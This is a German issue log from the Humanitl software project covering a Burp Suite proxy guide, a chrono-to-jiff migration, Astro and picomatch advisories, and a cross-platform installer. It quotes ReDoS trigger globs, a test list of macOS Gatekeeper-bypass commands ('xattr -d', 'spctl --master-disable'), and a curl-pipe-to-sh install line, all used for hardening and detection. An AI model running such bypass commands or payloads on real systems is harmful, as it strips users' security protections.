3. `docs/SECURITY.md` und `docs/THREAT-MODEL.md` (K-36) nennen die
   Verschlüsselung und ihre Grenze (der Daemon entschlüsselt für jede
   Sitzung) im selben Commit.

---

## HUM-524 · Entscheidungs-Proxy: Burp Suite in der Anleitung, mit Probelauf des Eigentümers

### Kontext
Der Eigentümer möchte neben mitmproxy auch Burp Suite als Entscheidungs-
Proxy hinter Humanitl nutzen (2026-11-16). HUM-513 hat Burp bewusst
ausgelassen: genannt wird ein Werkzeug erst, wenn ein aktueller Build
ausprobiert wurde (ADR-0022). Burp Community ist eine Desktop-Anwendung,
das Abfangen geschieht per Klick (Annahme, im Probelauf zu bestätigen); den
Probelauf macht deshalb der Eigentümer an seinem Rechner, die KI schreibt
den Abschnitt und bessert nach dem Lauf nach.

### Spezifikation
1. Abschnitt „Burp Suite" in `docs/guides/decision-proxy-mitmproxy.md`
   (oder eine eigene Anleitung, falls der Abschnitt die mitmproxy-Anleitung
   unübersichtlich macht) samt deutscher Übersetzung. Jede Aussage zu Burp
   mit Beleg aus der offiziellen PortSwigger-Dokumentation:
   - Proxy-Listener, Vorgabe `127.0.0.1:8080`
     ([Proxy settings](https://portswigger.net/burp/documentation/desktop/settings/tools/proxy)).
   - Burp-CA exportieren über „Import / export CA certificate", Format DER
     ([Managing CA certificates](https://portswigger.net/burp/documentation/desktop/tools/proxy/manage-certificates)),
     dann nach PEM für `egress.proxy_ca` (absoluter Pfad):
     `openssl x509 -inform der -in burp-ca.der -out burp-ca.pem`.
   - Abfangen mit „Intercept on", Entscheiden mit „Forward" und „Drop"
     ([Burp Proxy](https://portswigger.net/burp/documentation/desktop/tools/proxy)).
   - Wahl von `egress.proxy_resolve`: Für Clients ohne `CONNECT` erzeugt
     Burp das Blatt aus SNI
     ([Invisible proxying](https://portswigger.net/burp/documentation/desktop/tools/proxy/invisible));
     ob das auch bei `CONNECT IP:PORT` mit SNI-Name (`humanitl`) gilt und
     ob `CONNECT host:port` (`proxy`) sauber läuft, klärt erst der
     Probelauf.
2. Im Probelauf zu klären und in der Anleitung festzuhalten, ehrlich auch
   wenn es ungünstig ausfällt:
   - Prüft Burp das Zertifikat des Ziels? Wenn nein, sagt die Anleitung
     das deutlich: Die Verbindung vom Proxy zum Ziel ist dann nicht
     geprüft, und Humanitl kann das nicht ausgleichen.
   - Verbindet sich Burp vor der Entscheidung schon mit dem Ziel (wie
     mitmproxy mit Vorgaben, HUM-513)? Gezählt am Ziel oder im Log von
     Burp; wenn ja, Einstellung dagegen nennen oder die Grenze.
   - Was sieht der Agent bei „Drop": eine Antwort, ein Abbruch oder `502`
     erst nach `egress.proxy_response_timeout_secs`? Festgehalten in
     derselben Form wie die Tabelle „was der Agent sieht" für mitmproxy.
3. Ablauf: Die KI schreibt den Abschnitt und eine kurze Checkliste für den
   Probelauf (Burp-Version, beide Werte von `proxy_resolve`, `humanitl
   egress check`, eine Anfrage durchlassen, eine verwerfen, die drei
   Fragen aus Punkt 2). Der Eigentümer fährt sie und meldet die
   Beobachtungen; erst danach steht Burp mit Datum und Version als
   ausprobiert in der Anleitung.
4. Nach dem Probelauf: deutsche Übersetzung unter
   `docs/translations/de/guides/` nachziehen, die Zeile zur Anleitung in
   `docs/README.md` und den Satz zu Burp in ADR-0022 (Abschnitt Folgen) an
   das Ergebnis anpassen.
5. Kein Code, keine neuen Einstellungen. Fällt im Probelauf ein Fehler in
   Humanitl auf, wird er ein eigenes Issue. Das Issue wartet nach dem
   Schreiben des Abschnitts auf den Probelauf und hält den Sprint nicht
   auf.

### Entscheidung des Eigentümers vom 2026-11-18
Der Eigentümer macht den Probelauf jetzt nicht, und das Issue wartet nicht
auf ihn. Den Probelauf macht die KI selbst: Burp Community von
portswigger.net (Prüfsumme geprüft) unter Xvfb, nie auf dem echten
Bildschirm, Konfiguration nur in einem Wegwerf-Verzeichnis, Humanitl nur
über den Proxy-Crate gegen ein Stellvertreter-Ziel, nie gegen den echten
humanitld. Was dabei nicht zu beobachten ist, steht in der Anleitung als
„not observed in the AI trial" und geht in die Liste von HUM-553. Punkt 3
der Spezifikation (Eigentümer fährt die Checkliste) und die Wartepflicht
aus Punkt 5 entfallen damit; die Checkliste lebt als offene Punkte in
HUM-553 weiter.

### Akzeptanzkriterien
1. Die Anleitung nennt Burp nur mit dem Ergebnis eines Probelaufs auf
   einem aktuellen Build, mit Datum und Version.
2. Jede Aussage zu Burp hat einen Beleg aus der PortSwigger-Dokumentation
   oder ist als im Probelauf beobachtet gekennzeichnet.
3. Prüfung des Zielzertifikats und Verbindungszeitpunkt sind beantwortet
   und als Grenze genannt, wo sie ungünstig ausfallen.
4. Die Checkliste für den Probelauf liegt vor; `humanitl egress check`,
   eine durchgelassene und eine verworfene Anfrage sind als beobachtet
   festgehalten; die deutsche Übersetzung ist aktuell.

### Stand nach der Umsetzung (2026-11-18)

Probelauf der KI mit Burp Suite Community Edition 2026.11.2 (JAR,
SHA-256 gegen die Angabe von PortSwigger geprüft) unter Xvfb, Klicks per
`java.awt.Robot`, Humanitl als Proxy aus der Testunterstützung des
Proxy-Crates gegen den Listener `127.0.0.1:8080`, Ziel ein TLS-Server mit
selbstsigniertem Zertifikat, der jede Verbindung zählt. Belege (Protokolle
je Lauf, Screenshots) im Scratchpad der Sitzung unter `hum-524/q/*.out`
und `hum-524/work/`, nicht im Repository. Beobachtet: Prüfung
besteht mit beiden Werten von `proxy_resolve`; Forward und Drop wirken mit
beiden; „Verify upstream TLS" ist von Haus aus aus, das nicht vertraute
Ziel kommt durch; von 16 angehaltenen Anfragen mit gelesenem
Verbindungsprotokoll des Ziels hinterließen 15 vor der Entscheidung keine
Verbindung, eine einen TLS-Handschlag ohne Anfrage, die 10 danach nicht;
„Drop" liefert dem Agenten mit Vorgaben `200 OK` mit
Fehlerseite von Burp, mit „Suppress Burp error messages in browser"
sofort `502`; die vorgegebene Abfangregel lässt `.js`, `.css`, Bilder und
Schriften ohne Halt durch (gesehen an `/lib/app.js`: Ziel binnen 76 ms
kontaktiert, mit der Datei angehalten); Burp startet mit „Intercept off". Mit
`proxy_resolve = "humanitl"` löst Burp den Namen aus `Host` erneut auf und
übergeht die Adresse aus dem `CONNECT` (nachgewiesen mit einem Namen, den
Burp nicht kannte: „Unknown host"); die Anleitung empfiehlt deshalb
`proxy`. Die Anleitung bringt eine Projekt-Einstellungsdatei für
`--config-file` mit den drei nötigen Änderungen, deren Schlüssel aus einer
von Burp selbst gespeicherten Datei stammen und die nach einem Neustart
wirkten. ADR-0022 (Folgen) und `docs/README.md` nachgezogen. Offen für den
Eigentümer: HUM-553, Punkt 1.

---

## HUM-525 · Abhängigkeiten: `chrono` als nicht gepflegt gemeldet, Ausnahme mit Frist

### Kontext
Am 2026-11-17 erschien RUSTSEC-2026-0543: `chrono` gilt als nicht mehr
gepflegt, alle Versionen sind betroffen, empfohlen wird `jiff`. `make
rust-deny` scheitert damit in der CI für jeden Commit (zuerst gesehen am
Lauf von HUM-516), obwohl keine Lücke bekannt ist.

### Spezifikation
1. Ausnahme in `daemon/deny.toml` mit Grund und Prüfdatum, im selben Stil
   wie die bestehende für `unsafe-libyaml`.
2. Der eigentliche Wechsel ist HUM-526.

### Akzeptanzkriterien
1. `make rust-deny` ist wieder grün; die Ausnahme nennt Grund, Folge-Issue
   und Prüfdatum.

### Stand nach der Umsetzung (2026-11-17)
Ausnahme `RUSTSEC-2026-0543` in `daemon/deny.toml`, prüfen bis
2027-01-17. `chrono` formatiert und liest bei uns nur Zeitstempel und zeigt Zeiten im
lokalen Versatz des Hosts an; keine Zeitzonenregeln aus dem Netz. Review:
Sonnet als Ersatz für Antigravity kein blocking oder major, zwei minor zu
HUM-526 übernommen (fuzz-Crate, vollständige Crate-Liste).

---

## HUM-526 · Abhängigkeiten: von `chrono` auf `jiff`

### Kontext
HUM-525 hat die Meldung RUSTSEC-2026-0543 mit Frist ausgenommen. `chrono`
steht direkt in `daemon/Cargo.toml` und wird in fast allen Crates benutzt
(humanitl, humanitld, audit, audit-log, catalog, config, core-types,
ipc, proxy, recorder, rules, sandbox), teils in öffentlichen Schnittstellen
(`Expiry::At(DateTime<Utc>)`, `RuleSet::evaluate`), dazu eigenständig in
`daemon/fuzz/Cargo.toml` mit eigener Lock-Datei.

### Spezifikation
1. Alle direkten Verwendungen von `chrono` auf `jiff` umstellen, auch in
   `daemon/fuzz`; die Abhängigkeit setzt zentral, wer `daemon/Cargo.toml`
   pflegt, nicht ein Issue-Agent.
2. Ausgaben bleiben Byte für Byte gleich: Zeitstempel in Audit-Log,
   Recorder, CLI-Ausgabe (`--json` eingeschlossen) und Katalog. Wo `jiff`
   anders formatiert, wird das alte Format ausdrücklich nachgebildet; am
   meisten gefährdet sind `to_rfc3339_opts(SecondsFormat::Secs, true)`,
   das Format des Audit-Datensatzes (`audit/src/record.rs`) und die
   Serde-Form von `Expiry` in gespeicherten Regeln.
3. Gespeicherte Zeitstempel (Recorder-Datenbank, Audit-Dateien) bleiben
   lesbar, ohne Migration der Daten.
4. Die Ausnahme in `daemon/deny.toml` entfällt, sobald `chrono` auch nicht
   mehr transitiv gezogen wird; sonst bleibt sie mit dem Hinweis, wer es
   noch zieht.

### Tests
- Bestehende Tests mit festen Zeitstempeln bleiben unverändert grün.
- Rundreise: mit der alten Fassung geschriebene Zeilen und Datenbankfelder
  werden gelesen und gleich wieder ausgegeben.

### Akzeptanzkriterien
1. Kein direkter Gebrauch von `chrono` mehr; Ausgaben und gespeicherte
   Formate unverändert.

### Stand nach der Umsetzung (2026-11-19)
Alle Crates und `daemon/fuzz` rechnen mit `jiff::Timestamp`; `chrono` steht
in keiner Lock-Datei mehr, die Ausnahme `RUSTSEC-2026-0543` in
`daemon/deny.toml` ist entfernt. Die Textformen stehen von Hand in
`humanitl_core::time`, weil `jiff` Bruchteile mit so wenigen Stellen wie
nötig schreibt (`.5` statt `.500`): `rfc3339_secs` für `rules.yaml` und
`intercept`, `rfc3339_micros` für Audit-Log und `audit_anchors.ts`,
`rfc3339_auto` als Serde-Form von `Expiry::At`, `rfc3339_auto_offset`
(`+00:00`) für die Statusseite des Proxys, `compact_micros` für den Namen
einer beiseitegelegten Audit-Datei. Ein Differenzlauf gegen
`chrono` 0.4.45 über zwei Millionen Zeitpunkte zwischen den Jahren -9999 und
9999 ergab für alle Formen, die Millisekunden des Recorder-Filters, die
Wire-Form und die drei lokalen Zeitformen der CLI dieselben Bytes. Die CLI
liest die Zeitzone über `tz-system` und `tzdb-zoneinfo` wie vorher
`chrono::Local` aus `TZ` und `/etc/localtime`.

Abweichungen, bewusst nicht nachgebaut: Fehlertexte der Zeitparser in
`CLI_004` kommen jetzt aus `jiff`; `parse_rfc3339` nimmt etwas mehr an als
`chrono` (zum Beispiel `2026-09-03T10:00Z` ohne Sekunden, `+0200`, ein
Komma vor dem Bruchteil), lehnt aber nichts ab, was je geschrieben wurde;
mehr als neun Stellen Bruchteil schneidet es wie `chrono` ab. Eine von Hand
geschriebene Schaltsekunde `23:59:60` wird zu `23:59:59`, die Regel läuft
also eine Sekunde früher ab und wird mit `:59` zurückgeschrieben. Das bleibt
bewusst so: Humanitl schreibt nie `:60`, Schaltsekunden werden abgeschafft,
und eine eigene Darstellung dafür stünde in keinem Verhältnis zum Nutzen; Zeitpunkte jenseits des Jahres 9999 gibt es in
`jiff` nicht, die CLI zeigt dort `-`.

---

## HUM-527 · Website: `astro` auf 7.4.7 oder neuer (zwei Dependabot-Meldungen)

### Kontext
Dependabot meldet für `website/package-lock.json` zwei Lücken in `astro`
7.3.8:
- GHSA-r3h5-4585-7x3w (CVE-2026-126364, mittel): Der Endpunkt `/_image`
  des Adapters `@astrojs/node` kann Bilder aus einem Nachbarverzeichnis
  lesen, das sich nur in Groß- und Kleinschreibung vom Ausgabeverzeichnis
  unterscheidet. Behoben in 7.4.7.
- GHSA-mh32-jxcr-mh9f (CVE-2026-126361, niedrig): XSS über einen
  dynamischen Tag-Namen aus unvertrauter Eingabe. Behoben in 7.4.5.

Bewertung für humanitl.de: Die Seite wird statisch gebaut, ohne Adapter
(`website/astro.config.mjs`); den Endpunkt `/_image` gibt es nicht, die
erste Meldung trifft uns nicht. Der einzige dynamische Tag
(`website/src/components/security/Rich.astro`) bekommt seinen Namen aus
Inhalten im Repo, nie aus einer Anfrage; die zweite ist praktisch ohne
Risiko. Das Update ist Pflege, kein Notfall.

### Spezifikation
1. `astro` auf die neueste stabile 7.x ab 7.4.7, `@astrojs/markdown-remark`
   passend; Versionen weiter exakt angeheftet, Lock-Datei mit npm.
2. Bauen und die Prüfungen der Website (Build, Tests, Links,
   Übersetzungen) wie in der CI; Ausgabe gegen den alten Stand vergleichen.
3. Einige neue Unterpakete verlangen Node 22.23.4 oder neuer; die CI baut
   mit Node 24, lokal gilt dieselbe Untergrenze.

### Akzeptanzkriterien
1. Beide Dependabot-Meldungen sind nach dem Merge geschlossen; die gebaute
   Seite unterscheidet sich nur, wo das Update es erklärt.

### Stand nach der Umsetzung (2026-11-17)
`astro` 7.4.12, `@astrojs/markdown-remark` 7.3.9, exakt angeheftet; alle
Pakete aus registry.npmjs.org mit Integritäts-Hash, keine neuen
Installationsskripte, `npm audit` ohne Befund. Build (106 Seiten), 80
Tests, Links und Übersetzungen grün. Offline gebaut sind alle 248
gemeinsamen Dateien Byte für Byte gleich; neu fehlt nur ein
unreferenziertes Originalbild `_astro/intercept.*.png`. Kein Adapter,
`@astrojs/node` nicht im Lock. Review: Sonnet als Ersatz für Antigravity
keine Befunde am Update, ein minor (Node-Untergrenze) übernommen; zum Text
von HUM-528 drei major und sieben minor, alle eingearbeitet.

---

## HUM-551 · Website: `picomatch` ≤ 4.0.7 (ReDoS, Dependabot #3), noch ohne Fix

### Kontext
Dependabot meldet am 2026-11-18 (Alarm #3, „high") `picomatch` 4.0.7 in
`website/package-lock.json`, transitiv über `astro` 7.4.12 und
`@astrojs/markdown-remark` 7.3.9: Ein Glob wie `+(*)` oder `+(*a)` läuft in
`analyzeRepeatedExtglob` (`lib/parse.js`) in exponentielles Backtracking und
blockiert die Event-Loop. Betroffen ist alles bis 4.0.7; eine behobene
Fassung gibt es laut Meldung noch nicht.

Einschätzung: `picomatch` läuft bei uns nur im Build der Website (Astro
erzeugt statische Seiten für GitHub Pages, ohne Node.js zur Laufzeit), und
die Globs dort stammen aus unserem eigenen Code und der Astro-Konfiguration,
nicht von Besuchern. Ein Angreifer bräuchte Schreibzugriff auf das Repo, um
einen solchen Glob einzuschleusen, und hätte dann ohnehin mehr in der Hand.
Für das Produkt (Daemon, CLI, App) spielt das Paket keine Rolle. Die
Meldung ist damit kein ausnutzbarer Fehler, bleibt aber offen, bis es eine
behobene Fassung gibt.

### Spezifikation
1. Diese Einschätzung als Begründung festhalten; der Eigentümer schließt
   den Alarm in GitHub mit „Vulnerable code is not actually used" oder
   „Risk is tolerable" und verweist auf dieses Issue (nur er kann das, die
   API braucht Anmeldung).
2. Sobald `picomatch` eine behobene Fassung (> 4.0.7) veröffentlicht:
   `astro` bzw. die Lock-Datei so aktualisieren, dass sie greift, wie in
   HUM-527; falls Astro sie noch nicht zieht, über `overrides` in
   `website/package.json`, mit Kommentar und Verweis hierher.
3. Kein Patch und keine eigene Kopie von `picomatch` (CLAUDE.md: keine
   Abstraktion über Fremdbibliotheken).

### Tests
- Nach dem Update: `npm ci`, `npm run build` und die Website-Checks der CI
  grün; `npm ls picomatch` zeigt keine Fassung ≤ 4.0.7 mehr.

### Akzeptanzkriterien
1. Bis zu einer behobenen Fassung ist die Einschätzung dokumentiert und
   der Alarm mit Begründung geschlossen.
2. Danach liegt keine betroffene Fassung mehr in `website/package-lock.json`.

---

## HUM-528 · Ein Installationsskript für alle Systeme unter `humanitl.de/install`

### Kontext
Heute installiert `curl -fsSL https://apt.nurkert.de/install/humanitl |
sudo sh` nur auf Debian und Verwandten. Jedes Release bringt aber schon
`.deb`, `.rpm` (in Fedora 44 geprüft), AppImage, `tar.gz`, `.dmg`/`.zip`
und `SHA256SUMS` mit. Wunsch des Eigentümers vom 2026-11-17: ein einziges,
umfassendes Skript für alle Linux-Distributionen und macOS.

### Spezifikation
1. Datei `install.sh` im Wurzelverzeichnis des Repos, reines POSIX-`sh`,
   der ganze Ablauf in einer Funktion, die erst am Ende aufgerufen wird
   (ein abgebrochener Download führt nichts halb aus).
2. Erkennen: Betriebssystem, Architektur, unter Linux `/etc/os-release`
   (`ID`, `ID_LIKE`). Linux-Pakete gibt es nur für x86_64, macOS als
   Universal-Build; eine andere Architektur (etwa aarch64 unter Linux)
   bekommt eine klare Meldung, und nichts geschieht. Wege:
   - Debian, Ubuntu und Verwandte: das APT-Repo `apt.nurkert.de` wie heute
     (Schlüssel nach `/usr/share/keyrings/`, Quelle nach
     `/etc/apt/sources.list.d/`), Updates über `apt upgrade`.
   - Fedora, RHEL, Rocky, Alma: `.rpm` aus dem Release mit `dnf install`.
     openSUSE nur, wenn ein Container-Check im Release (wie `check-rpm`
     für Fedora) Abhängigkeitsnamen und `zypper install
     --allow-unsigned-rpm` für das unsignierte Paket bestätigt; bis dahin
     nimmt openSUSE den Archiv-Weg.
   - Arch, Manjaro: über einen vorhandenen AUR-Helfer (`paru`, `yay`),
     sofern `humanitl-bin` im AUR veröffentlicht ist (das lädt der
     Maintainer von Hand hoch, `packaging/aur/README.md`); sonst das
     Archiv.
   - sonstiges Linux: `tar.gz` nach `~/.local`, ohne root.
   - macOS: `.dmg` laden, einhängen, `Humanitl.app` nach `/Applications`
     (ohne Schreibrecht dort nach `~/Applications`), aushängen.
   Aktualisieren: APT über `apt upgrade`; die anderen Wege durch erneuten
   Aufruf des Skripts, das eine vorhandene Installation erkennt und
   ersetzt. Voraussetzungen der Sandbox (Benutzer-Namensräume, Sandbox-
   Backend) prüft danach `humanitl sandbox check`.
   - Windows und Unbekanntes: klare Meldung, nichts wird getan.
3. Das Skript läuft als normaler Nutzer und ruft `sudo` nur für den
   Paketschritt; den Befehl zeigt es vorher. Vor jedem Eingriff steht, was
   geschieht, mit Rückfrage; `--yes` überspringt sie, `--dry-run` zeigt
   nur an, ohne Terminal ohne `--yes` bricht es ab statt zu raten.
   Optionen: `--version X.Y.Z`, `--method apt|rpm|aur|tarball|dmg`,
   `--prefix` für das Archiv.
4. Downloads nur über HTTPS von den GitHub-Releases; jede Datei gegen
   `SHA256SUMS` geprüft (eine Datei für alle Assets, auch macOS): Das
   Skript sucht die Zeile mit dem Dateinamen und bricht ab, wenn sie fehlt
   oder nicht passt. Das Skript sagt ehrlich, dass Releases vor 1.0.0
   unsigniert sind: Die Prüfsumme schützt vor kaputten Downloads, nicht vor
   einem manipulierten Release.
5. macOS-Quarantäne (Entscheid des Eigentümers): Das Skript entfernt oder
   umgeht sie nie, auch nicht auf Wunsch. Weil `curl` anders als ein
   Browser kein `com.apple.quarantine` setzt, setzt das Skript es selbst
   auf die kopierte App (wie Homebrew bei Casks), damit Gatekeeper sie
   genauso prüft wie nach einem Download im Browser. Danach erklärt es den
   Weg über Systemeinstellungen › Datenschutz & Sicherheit › „Trotzdem
   öffnen", falls macOS den ersten Start sperrt.
6. Danach auf Nachfrage `humanitl daemon install` und `humanitl sandbox
   check`.
7. Website (GitHub Pages, kein eigener `Content-Type` möglich): Der Build
   kopiert `install.sh` unverändert nach `https://humanitl.de/install` für
   `curl`; kein Abruf zur Laufzeit. Ein Browser würde diese Datei ohne
   Endung herunterladen statt anzeigen, deshalb führt „Skript vorher
   lesen" auf eine eigene HTML-Seite, die beim Build aus derselben Datei
   entsteht und den Quelltext mit Hervorhebung zeigt. Ein Test prüft, dass
   `/install` Byte für Byte `install.sh` entspricht und die Leseseite
   denselben Text enthält. Im Landing-Bereich der Startseite steht der
   Einzeiler `curl -fsSL https://humanitl.de/install | sh` mit einem
   Knopf, der genau diesen Befehl kopiert (nicht das Skript), dazu der
   Link „Skript vorher lesen". Die Content-Security-Policy verbietet
   Inline-Skripte, der Knopf kommt deshalb als eigene Skriptdatei. Die
   Download-Seite (`website/src/components/pages/Download.astro`) zeigt
   denselben Befehl.
8. `apt.nurkert.de/install/humanitl` liegt nicht im Repo, sondern auf dem
   APT-Server des Eigentümers. Es bleibt funktionsfähig (wer es mit `|
   sudo sh` aufruft, bekommt weiter das Paket) und nennt zusätzlich das
   neue Skript; die Änderung dort macht der Eigentümer von Hand, das Issue
   liefert den Text. Im Repo nennen den neuen Einzeiler: `README.md`,
   `README.de.md`, `docs/INSTALL.md`, `docs/translations/de/INSTALL.md`,
   `docs/guides/install.md` samt Übersetzung, die Texte der Website
   (`en.ts`, `de.ts`) und `website/src/components/pages/Download.astro`.

### Tests
- shellcheck ohne Befund; `sh -n` mit `dash` und `busybox sh`.
- CI-Matrix in Containern: Debian, Ubuntu, Fedora, openSUSE, Arch, ein
  sonstiges Linux (Archiv-Weg), dazu ein macOS-Runner; jeweils mit einem
  lokalen Stellvertreter für die Release-Dateien (Basis-URL über eine
  Umgebungsvariable), danach `humanitl --version`.
- `--dry-run` ändert nichts; eine falsche Prüfsumme und eine fehlende
  Zeile in `SHA256SUMS` brechen ab, bevor etwas installiert wird
  (Mutationsbeweis: Prüfung entfernt färbt beide Tests rot).
- macOS-Runner: Nach der Installation trägt die App `com.apple.quarantine`.
  Das Skript enthält kein `xattr -d`, `xattr -c` und kein `spctl
  --master-disable` (Test über den Quelltext).
- aarch64-Linux, Windows (`MINGW`/`MSYS`) und ein unbekanntes System:
  Meldung, nichts geändert.
- Die Website liefert unter `/install` dieselben Bytes wie `install.sh`.

### Akzeptanzkriterien
1. Auf jedem genannten System führt `curl -fsSL https://humanitl.de/install
   | sh` zu einem laufenden `humanitl`; auf anderen Systemen und
   Architekturen ändert es nichts und sagt warum.
2. Das Skript umgeht die macOS-Quarantäne nie; eine damit installierte App
   prüft Gatekeeper wie nach einem Browser-Download.
3. `--dry-run` ändert nichts; ohne Terminal und ohne `--yes` bricht das
   Skript ab; eine falsche oder fehlende Prüfsumme bricht vor jeder
   Installation ab.
4. `/install` liefert genau `install.sh`; „Skript vorher lesen" zeigt den
   Text im Browser.

### Nachfolger, wenn Releases signiert sind
Ab 1.0.0 sind Releases signiert (Entscheid des Eigentümers zu 0.1.0), die
macOS-App dann mit Developer ID und Notarisierung. Dann soll das Skript
verbessert werden: Signaturen prüfen statt nur `SHA256SUMS`, und der
Hinweis auf „Trotzdem öffnen" auf macOS entfällt, weil Gatekeeper eine
notarisierte App ohne Rückfrage startet. Das wird dann ein eigenes
Issue.

### Stand nach der Umsetzung (2026-11-19)

**Skript.** `install.sh` im Wurzelverzeichnis, POSIX-`sh`, nur Funktionen und als letzte Zeile `main "$@"`. Erkannt werden `uname -s`/`-m` und `/etc/os-release` (gelesen, nicht ausgeführt; `ID` vor `ID_LIKE`). Wege: `apt` (Schlüssel, Quelldatei und Quellzeile genau wie das Skript auf `apt.nurkert.de`, beide können nacheinander laufen), `rpm` (Fedora, RHEL, CentOS, Rocky, Alma; `dnf install -y` der geprüften Datei), `aur` (nur wenn `paru` oder `yay` da ist, `<helper> -Si humanitl-bin` das Paket kennt, nicht als root und ohne `--version`), `tarball` (openSUSE und alles andere; nach `<prefix>/lib/humanitl`, Links `humanitl`, `humanitld`, `humanitl-app` in `<prefix>/bin`, Liste `INSTALLED-FILES` für HUM-550; ein fremdes Verzeichnis oder ein fremder Link an diesen Stellen bricht ab), `dmg` (einhängen, mit `ditto` nach `.Humanitl.app.new`, `xattr -r -w com.apple.quarantine "0081;<zeit>;humanitl-install;"`, erst dann umbenennen; ohne Schreibrecht in `/Applications` nach `~/Applications`). Linux verlangt glibc 2.39 (`getconf GNU_LIBC_VERSION`), sonst Meldung und nichts geändert, ebenso musl, aarch64, Windows (`MINGW`, `MSYS`, `CYGWIN`) und unbekannte Systeme. Jeder Schritt läuft zweimal durch dieselbe Funktion: einmal als Plan (angezeigt, `--dry-run` endet hier), einmal echt; eine Rückfrage vor dem Eingriff, je eine vor `daemon install` und `sandbox check`. Kinder lesen `/dev/tty` oder `/dev/null`, nie die Pipe des Skripts. Downloads nur `https://` (`--proto =https`, auch bei Umleitungen) oder `file://` für Spiegel und Tests; `SHA256SUMS` zuerst, dann die Datei, Abbruch bei fehlender Zeile oder falscher Summe. Umgebung für Tests: `HUMANITL_RELEASES_URL`, `HUMANITL_APT_URL`, `HUMANITL_OS_RELEASE`. Zusätzlich zur Spezifikation: `--no-setup` (keine Nachfragen zu `daemon install` und `sandbox check`, für die Tests), `--help`. Unter macOS führt das Skript nach der Installation nichts aus dem Bündel aus, weil Gatekeeper ein markiertes, nicht notarisiertes Programm bis zur Freigabe sperrt; es nennt den Weg über „Open Anyway" und die Befehle mit vollem Pfad. Die Kommentare von `install.sh` sind englisch, nicht deutsch: Die Datei ist eine Nutzerdatei wie `packaging/release/INSTALL.txt`, und die Leseseite zeigt sie beiden Sprachen.

**Website.** Die Integration `humanitl-install-script` in `astro.config.mjs` schreibt nach dem Bau die Bytes von `install.sh` nach `dist/install`. Die Leseseite steht unter `/installationsskript/` und `/en/install-script/` (eigener Eintrag `installer` in `ui.ts`; `/install/` geht nicht, dort liegt die Datei), liest dieselbe Datei über Vite `?raw` und zeigt sie mit Shiki. `scripts/install-check.mjs` (`npm run check-install`) prüft nach dem Bau Byte-Gleichheit und den Text beider Leseseiten, `scripts/install-check.test.mjs` prüft die Prüfung an erfundenen Eingaben. Der Kopierknopf ist `src/scripts/copy.ts` (aus `download.ts` herausgelöst), die Zeile mit Knopf `src/components/InstallCommand.astro`. Die Download-Seite zeigt unter Linux und macOS den Einzeiler, der Link „Das Skript vorher lesen" führt auf die Leseseite; der bisherige macOS-Befehl mit `xattr -dr` steht dort nicht mehr. `website.yml` baut jetzt auch bei Änderungen an `install.sh` und fährt `check-install`.

**Abweichung: Ort des Einzeilers auf der Startseite.** Er steht im Abschlussabschnitt (`Maturity.astro`, unter dem Download-Knopf, mit „Das Skript vorher lesen"), nicht im Hero. Der Hero rechnet seine Höhe über Klassen vorab (HUM-418) und der Fächer misst Knöpfe und Hinweis; eine weitere Zeile dort braucht eine eigene Prüfung über alle Klassen A bis G. Kandidat für ein eigenes Issue, wenn der Eigentümer den Einzeiler im Hero will.

**CI.** `tools/ci-changes.sh` kennt zwei neue Bereiche: `install.sh` startet `install-script`, `install-linux` und `install-macos`, sonst nichts (vorher ein voller Lauf als unbekannter Pfad); `website/**` startet `install-script` (vorher gar nichts). `install-script` (ubuntu-24.04): `make install-script-test` mit `INSTALL_TEST_STRICT=1`, ein `--dry-run` gegen die echten Releases (findet die neueste Version über die Umleitung von `/releases/latest`), dann `npm ci`, `npm test`, Bau, `check-install`, `check-links`. `install-linux`: ein Job, sechs Container nacheinander (`tools/tests/install_sh_containers.sh`, Abbilder per Digest): Debian 13 und Ubuntu 24.04 über ein lokales, signiertes APT-Repository mit dem `.deb` des neuesten Releases, Fedora 44 über `dnf`, openSUSE Tumbleweed, Arch und ein Debian mit unbekannter `os-release` über das Archiv; je `--dry-run` ohne Änderung, zwei Installationen, `humanitl --version`. Ein Job statt Matrix, weil sechs Runner-Starts mehr kosten als die Container. `install-macos` (macos-15, eigener Job statt Schritt in `macos`, der Rust und Flutter baut): `tools/tests/install_sh_macos.sh` gegen ein mit `hdiutil` gebautes Stellvertreter-Image; Quarantäne auf jeder Datei, Ersetzen, falsche Prüfsumme. `ci_plan_test.py`, `ci_changes_test.sh` (neue Fälle `install_branch`, `install_main`, Website-Fälle angepasst) und `ci-ok` kennen die drei Jobs.

**Lokal gelaufen (2026-11-19).** `tools/tests/install_sh_test.sh` mit `INSTALL_TEST_STRICT=1` grün (shellcheck 0.11 aus `shellcheck-py`, dash, busybox sh; nach dem Review 60 Fälle). `install_sh_containers.sh` mit rootless podman auf allen sechs Systemen grün, gegen die Dateien von 0.4.1. Website: `npm test`, Bau, `check-install`, `check-links` grün; Leseseite, Download-Seite und Abschlussabschnitt im Bildschirmfoto geprüft. `make tools-test` und `make docs-lint` grün. Nicht lokal: der macOS-Lauf (kein Mac), er läuft nur in CI.

**Mutationsbeweise.** In `install_sh_test.sh` eingebaut: Ohne die Prüfung (Zeile `[ -n "$fv_want" ] || die` entfernt, Vergleich `if false`) werden alle vier Prüfsummen-Fälle rot (Archiv und RPM, falsche Summe und fehlende Zeile); `xattr -dr` statt `xattr -r -w` im Skript färbt die Quelltextprüfung rot, und die Prüfung erkennt `xattr -dr`, `xattr -c`, `xattr -r -d`, `spctl --master-disable` und `--global-disable`. `install-check`: ein Byte mehr in `dist/install` und ein geändertes Wort auf der englischen Leseseite färben die Prüfung rot. `ci_changes_test.sh`: ohne die Regel für `install.sh` fällt die Datei in den vollen Lauf, `install_branch` wird rot.

**Offen.** Punkt 8: Der Text für `apt.nurkert.de/install/humanitl` liegt beim Eigentümer, die Änderung auf dem Server macht er von Hand. Kandidaten: eine Desktop-Datei für den Archiv-Weg; openSUSE auf das `.rpm` umstellen, sobald ein Release-Check `zypper install --allow-unsigned-rpm` bestätigt; nach 1.0.0 Signaturen prüfen und den Hinweis auf „Dennoch öffnen" streichen (siehe oben).

